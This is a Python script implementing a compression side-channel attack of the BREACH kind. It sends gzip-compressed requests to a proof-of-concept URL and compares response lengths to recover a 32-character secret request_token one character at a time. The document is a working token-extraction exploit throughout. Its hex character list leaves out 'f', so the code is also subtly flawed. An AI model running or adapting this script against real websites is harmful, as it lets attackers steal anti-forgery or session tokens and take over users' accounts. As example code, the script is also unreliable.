import urllib.parse
import urllib.request
"""
    Function Name: enviarPeticion
    Input: url that the request will be sent to
           req the actual request that will be returned as an output of the function as to be sent
           secreto the secret word that we want to find
           extra the payload that we will add to the request in order to distinguish the secret that we are trying from the rest of the payload
    Output: req the request ready to be sent
    Function: Prepares the request to be sent, it uses the option of compressing by gzip uses the library urllib.request
"""
def enviarPeticion(url,req,secreto,extra):
    url = url + secreto + extra
    req = urllib.request.Request(url)
    req.add_header('User-Agent','Mozilla/5.0 (Windows NT 6.1; Win64; x64)')
    req.add_header('Accept-Encoding','gzip, deflate')
    return req
"""
    Function Name: obtenerLongitud
    Input: req the request prepared to be launch
    Output: length of the response
    Function: Sends the request and returns the length of the compressed response
"""
def obtenerLongitud(req):
    with urllib.request.urlopen(req) as response:
        the_page = response.read()
        longitud=len(the_page)
        return longitud
#'Initialization parameters: Take a look at the url, which one provided, and the secret that we want to check is going to be request_token'        
req=0
secreto = ''
longitud=32
breaks = "{}{}{}"
menor = 100000
index=0
url="http://malbot.net/poc/?request_token='"
i= 0
flag = True
# Caracters is going to be our dictionary and can be variable, in this case, we only need the hex characters. We are going to use the ASCII encoding.
caracteres=[48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101]
no=0
# We will iterate 32 times, that is the actual length of the secret
for j in range(longitud):
    url="http://malbot.net/poc/?request_token='"
    menor=100000
    flag = True
    # We will check every character in the dictionary, until we find the one that suits the secret, which will be the one with the lowest response length, in case of a collision, because of the Huffing compression, we will swap the payload with the character that we will be trying.
    while flag:
        caracter = chr(caracteres[i])
        req=enviarPeticion(url, req , secreto, caracter + breaks  + "'")
        longitud1=obtenerLongitud(req)
        if(longitud1<= menor):
            if(longitud1==menor):
                req=enviarPeticion(url,req, secreto, breaks  + chr(caracteres[index]) + "'")
                longitud2=obtenerLongitud(req)                                
                if ((longitud1-longitud2) < 0):
                    secreto = secreto + chr(caracteres[index])
                    i=0
                    flag = False
                else:
                    req=enviarPeticion(url, req, secreto, breaks  + caracter + "'")
                    longitud2=obtenerLongitud(req)                                                
                    if ((longitud1-longitud2) < 0):
                        secreto = secreto + caracter
                        i=0
                        flag = False  
                no=1
            if(no==1 and longitud1 != menor):
                no=0                        
            menor = longitud1
            index = i
        i=i+1
        # If there is a third collision, not finding the one with the lowest length and swapping it with the payload, we will change the url and try with the new one without the parameter inserted.
        if(i == len(caracteres) and no==1 and index != i and longitud1==menor):
            no=0
            url = "http://malbot.net/poc/?'"
            i=0
        if(i == len(caracteres)):
            i=0
            secreto = secreto + chr(caracteres[index])
            flag = False
    print(secreto)       
